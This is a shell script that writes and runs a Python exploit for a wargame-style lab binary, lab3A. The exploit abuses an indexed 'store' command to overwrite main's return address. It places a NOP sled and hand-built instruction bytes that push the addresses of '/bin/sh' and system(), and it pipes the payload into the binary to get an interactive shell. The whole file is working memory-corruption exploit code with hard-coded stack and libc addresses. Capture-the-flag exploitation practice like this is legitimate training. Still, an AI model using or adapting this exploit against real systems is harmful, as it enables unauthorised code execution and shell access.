#!/bin/sh

cd /levels/lab03
cat <<EOF>/tmp/exp3a.py
#!/usr/bin/python

import sys
import struct

def store(idx, val):
    assert idx % 3 != 0
    o = 'store\n'
    if type(val) == type(''):
        val = struct.unpack("<I", val)[0]
    o+= '%u\n' % val
    o+= '%u\n' % idx
    return o

def prepare8(idx, instrbytes):
    o = ''
    o += '\x90' * (6-len(instrbytes))
    o += instrbytes
    o += '\xeb\x04'
    return store(idx, o[:4]) + store(idx+1, o[4:])

def increment_idx(idx, num):
    if (idx+num) % 3 == 0:
        return num+1
    else:
        return num

def exp():
	# mind that there is a gap between addresses from GDB and without it
	# that equals 0x40. Meaning, if there is a 0xbffff48c address under GDB
	# x/xw command - then outside of the GDB it should be 0xbffff44c (-0x40)
	# due to varying stack layout and environment variables values

    retaddr = 0xbffff44c
    retsystem = 0xb7e63190
    binsh = 0xb7f83a24

    if len(sys.argv) > 0:
        n = sys.argv[1]
        retaddr = int(n, 16)

        sys.stderr.write("Return address: 0x%08x\n" % retaddr)

    ret1 = struct.pack("<I", retaddr)
    ret2 = struct.pack("<I", retsystem)
    param = struct.pack("<I", binsh)

    buf = ''

	# Overwriting main's return address
    buf += store(109, ret1)

    nopsled = [x for x in range(40) if x % 3 != 0 and x > 0 and (x+1) % 3 != 0]
    idx = 0
    for i in nopsled:
        buf += prepare8(i, "\x90")

    idx += increment_idx(idx, 40)

	# Below we are constructing a simple return-into-system

	# /bin/sh
    buf += prepare8(idx, "\x68" + param)
    idx += increment_idx(idx, 2)

	# junk
    buf += prepare8(idx, "\x68" + "CCCC")
    idx += increment_idx(idx, 2)

	# system(...)
    buf += prepare8(idx, "\x68" + ret2)
    idx += increment_idx(idx, 2)

    buf += prepare8(idx, "\xc3")
    idx += increment_idx(idx, 2)

    buf += "quit\n"
    sys.stdout.write(buf)

if __name__ == '__main__':
    exp()
EOF
chmod +x /tmp/exp3a.py
/tmp/exp3a.py 0xbffff44c > /tmp/test19 ; (cat /tmp/test19 ; cat ) | ./lab3A
